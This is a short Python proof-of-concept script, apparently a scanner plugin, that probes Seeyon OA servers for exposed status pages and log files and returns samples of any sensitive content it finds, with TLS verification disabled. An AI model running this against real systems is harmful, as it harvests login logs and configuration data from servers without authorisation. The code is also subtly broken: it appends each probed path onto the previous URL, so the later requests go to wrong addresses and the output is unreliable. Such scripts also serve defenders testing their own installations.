import requests

def _verify(target):
    url = target["target"]
    paths = [
        "/seeyon/management/status.jsp",
        "/seeyon/logs/login.log",
        "/seeyon/logs/v3x.log"
    ]
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
    results = []
    for path in paths:
        url = f"{url}{path}"
        try:
            resp = requests.get(url, headers=headers, timeout=10, verify=False)
            if resp.status_code == 200 and len(resp.text) > 0:
                # 检查是否包含敏感信息
                if 'A8' in resp.text or 'Online Users' in resp.text or 'Login' in resp.text or 'datasource' in resp.text.lower():
                    results.append(f"{path} accessible, content length {len(resp.text)}, sample: {resp.text[:200]}")
        except Exception:
            pass
    if results:
        return {'target': url, 'result': '; '.join(results)}
    return None

if __name__ == "__main__":
    print(_verify({'target': 'http://example.com'}))